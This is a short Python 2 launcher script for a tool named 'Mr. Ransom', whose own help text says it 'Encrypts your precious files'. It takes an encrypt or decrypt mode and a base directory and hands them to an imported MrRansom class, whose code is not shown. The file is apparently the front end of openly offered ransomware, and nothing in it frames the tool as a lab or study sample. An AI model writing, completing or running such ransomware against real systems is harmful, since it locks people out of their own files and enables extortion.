import argparse
import os
import time

from script.mrransom import MrRansom

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='mr-ransom', description='Mr. Ransom - Encrypts your precious files.')
    parser.add_argument('-m', '--mode', type=str, required=True, choices=['e', 'encrypt', 'd', 'decrypt'],
                        help='choose which process to complete')
    parser.add_argument('-d', '--dir', type=str, required=True, help='specify the base directory to process')

    args = parser.parse_args()

    start_time = time.time()

    ransom = MrRansom(16, os.path.expanduser(args.dir))
    if args.mode == 'e' or args.mode == 'encrypt':
        ransom.encrypt()
    elif args.mode == 'd' or args.mode == 'decrypt':
        ransom.decrypt()

    print "Took {}s".format(time.time() - start_time)
